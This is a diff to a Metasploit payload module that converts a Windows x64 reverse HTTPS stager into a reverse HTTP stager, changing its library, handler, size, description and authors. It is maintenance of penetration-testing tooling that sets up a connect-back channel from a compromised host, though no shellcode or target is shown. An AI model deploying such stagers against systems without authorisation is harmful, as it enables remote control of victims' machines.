@@ -5,26 +5,26 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
-require 'msf/core/payload/windows/x64/reverse_https'
+require 'msf/core/payload/windows/x64/reverse_http'
 
 module Metasploit4
 
-  CachedSize = 568
+  CachedSize = 529
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
-  include Msf::Payload::Windows::ReverseHttps_x64
+  include Msf::Payload::Windows::ReverseHttp_x64
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Windows x64 Reverse HTTPS Stager',
-      'Description' => 'Tunnel communication over HTTP using SSL (Windows x64)',
-      'Author'      => [ 'hdm', 'agix', 'rwincey' ],
+      'Name'        => 'Windows x64 Reverse HTTP Stager',
+      'Description' => 'Tunnel communication over HTTP (Windows x64)',
+      'Author'      => ['OJ Reeves'],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
       'Arch'        => ARCH_X86_64,
-      'Handler'     => Msf::Handler::ReverseHttps,
-      'Convention'  => 'sockrdi https',
+      'Handler'     => Msf::Handler::ReverseHttp,
+      'Convention'  => 'sockrdi http',
       'Stager'      => { 'Payload' => '' }))
   end
 
